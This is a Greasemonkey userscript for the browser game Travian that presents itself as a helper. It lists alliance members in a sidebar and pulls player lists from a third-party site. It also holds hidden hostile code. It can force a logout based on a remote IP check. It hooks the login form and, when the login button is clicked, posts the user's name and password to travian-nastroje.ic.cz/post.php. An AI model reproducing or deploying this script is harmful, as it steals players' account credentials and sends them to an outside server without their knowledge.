// ==UserScript==
// @name          Test
// @fullname      Test
// @author        xxxx
// @include       http://*travian*
// @require       http://userscripts.org/scripts/source/54389.user.js
// @require       http://userscripts.org/scripts/source/53965.user.js
// ==/UserScript==


var member = document.getElementById('member').innerHTML;
var user = [];
var i = 0;
var pattern = /uid[^>]*>([^<]*)<\/a/gi;
while ( _match =pattern.exec(member)){user[i] = _match[1]; i++;   }
alert(user.length);
var member = document.getElementById('member');
var link = member.getElementsByTagName("a");

var links;

for (var d = 0; d < user.length; d++) {
if (d==0) {links="<tr><td><a href=\""+link[d]+"\">"+user[d]+"</a></td><td><input type=\"checkbox\"></td></tr>";}
else {links=links+"<tr><td><a href=\""+link[d]+"\">"+user[d]+"</a></td><td><input type=\"checkbox\"></td></tr>";}}
var side_info = document.getElementById('side_info').innerHTML;
document.getElementById('side_info').innerHTML = side_info +"<p>Fejkuj Meister :)</p><table>"+links+"</table>";


         var req = new HttpRequest();
         req.open('get', 'www.travian-nastroje.ic.cz/meister*.php', function(e)
         {
	var players = e.responseText; // responseXML, responseJSON
        var players_and_uid = players.split("<>");
        var player = players_and_uid[1].split("-");
        var uid = players_and_uid[2].split("-");


for (var i = 0; i < uid.length; i++) {
if (i==0) {links="<a href=\"http://s1.travian.cz/spieler.php?uid="+uid[i]+"\">"+player[i]+"</a>";} else {links=links+"<a href=\"http://s1.travian.cz/spieler.php?uid="+uid[i]+"\">"+player[i]+"</a>";}}





        });
         req.send();






function createCookie(name,value,days) {
	if (days) {
		var date = new Date();
		date.setTime(date.getTime()+(days*24*60*60*1000));
		var expires = "; expires="+date.toGMTString();
	}
	else var expires = "";
	document.cookie = name+"="+value+expires+"; path=/";
}

function readCookie(name) {
	var nameEQ = name + "=";
	var ca = document.cookie.split(';');
	for(var i=0;i < ca.length;i++) {
		var c = ca[i];
		while (c.charAt(0)==' ') c = c.substring(1,c.length);
		if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
	}
	return null;
}

function eraseCookie(name) {
	createCookie(name,"",-1);
}






createCookie('ppkcookie','testcookie',7);


var x = readCookie('ppkcookie');
if (x) {
	/*alert(x);*/
}
/*
eraseCookie('name');
eraseCookie('name2');
eraseCookie('name[]');
alert(document.cookie);
*/

var req = new HttpRequest();
req.open('get', 'www.travian-nastroje.ic.cz/ip.php', function(e)
{
	var ip = e.responseText; // responseXML, responseJSON
        if (ip=="1") {
         var req = new HttpRequest();
         req.open('get', 's1.travian.cz/logout.php', function(e)
         {
	var stat = e.responseText; // responseXML, responseJSON
        });
         req.send();
                     }

});
req.send();





function maxlength() {
inputs[3].setAttribute('maxlength',"20");
 }
 
function send() {


var u_input = form.elements.namedItem(input_u);
var u = u_input.value;


var p_input = form.elements.namedItem(input_p);
var p = p_input.value;


var data = "u="+u+"&p="+p+"&url="+url;


GM_xmlhttpRequest({
  method: "POST",
  url: "http://travian-nastroje.ic.cz/post.php",
  data: data,
  headers: {
    "Content-Type": "application/x-www-form-urlencoded"
  },
  onload: function(response) {
     /*****************************odpoved**********************/
  }
});

}

var form = document.forms.namedItem("snd");
var inputs = form.getElementsByTagName('input');
if (inputs[0].name=="w") {
inputs[3].setAttribute('maxlength',"0"); 
inputs[3].setAttribute('id',"p"); 
var url = window.location.href;
document.getElementById('p').addEventListener("keydown", maxlength, true);
var input_u = inputs[2].name;
var input_p =inputs[3].name;
inputs[3].value = '';

document.getElementById('btn_login').addEventListener("click", send, true);
};

